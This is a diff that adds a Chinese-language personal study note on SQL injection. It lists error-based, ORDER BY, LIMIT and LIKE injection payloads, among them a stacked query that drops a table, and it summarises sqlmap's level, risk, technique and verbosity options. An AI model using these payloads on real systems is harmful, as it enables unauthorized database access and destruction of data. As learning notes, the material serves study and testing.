@@ -1,0 +1,112 @@
+报错注入  and(语句)
+
+insert 注入点位置    
+
+​		aa" or 报错语句 or "aaaa
+
+​		aaaa" and IF()
+
+update注入点位置
+
+​		<https://www.cnblogs.com/xiaozi/p/5532623.html>
+
+delete注入  报错注入
+
+​	DELETE FROM users WHERE id=1 or extractvalue(1,concat(0x7e,database())) or'';
+
+如果注入点都在最后得话，？采用 and  IF  boolean  或时间注入
+
+
+
+order by  注入
+
+```
+https://www.cnblogs.com/icez/p/Mysql-Order-By-Injection-Summary.html
+《上面得比较详细》
+https://www.freebuf.com/column/145988.html
+$query  = “select * from test order by user_id [$evil|inject];”
+payload：
+select * from test order by user_id^(select(select version()) regexp '^5');
+select * from users order by (case when (true) then lastname else firstname)
+
+$query  = “(select * from test order by user_id $evil);”
+)union(select 1,(select vsersion()),3)--+
+```
+
+
+
+limit注入
+
+​	https://www.cnblogs.com/Mrsm1th/p/9004212.html
+
+select * from table limit 1 procedure analyse(updatexml(rand(),concat(0x3a,benchmark(10000000,sha1(1)))),1)
+
+
+
+like注入
+
+```
+$sql = 'student_name like '"%'.$name.'%"';
+```
+
+​	正常得sql语句
+
+```
+SELECT * FROM tblStudent WHERE unit_name like "%aaa%" order by create_time desc limit 0, 30 ;
+```
+
+​	拼接
+
+```
+aaa%" or "1%"="1%
+此拼接是否可以探测成注入点
+```
+
+​	拼接2
+
+```
+aaa%";drop table tbl_test;#形成堆叠注入，前面得sql语句可以正常执行
+```
+
+
+
+
+
+sqlmap 
+--level
+	1get
+	2cookie
+	3head useragent
+	4 
+	5level>=5时，会测试HOST
+--risk
+	1,测试大部分语句
+	2，增加基于事件得测试语句  在UPDATE得语句中或insert
+	3，增加OR语句得SQL注入测试
+	4，
+--techique
+	1，B boolean
+	2, E 报错
+	3，U union
+	4, S 多语句查询
+	5，T  时间延迟注入
+	6，OOB带外
+
+-v   
+
+​	一共有六级：
+
+​	0：只显示python 错误和一些严重信息；
+
+​	1：显示基本信息（默认）；
+
+​	2：显示debug信息；
+
+​	3：显示注入过程的payload；
+
+​	4：显示http请求包；
+
+​	5：显示http响应头；
+
+​	7：显示http相应页面。
+sql注入还需学习...不行唉...
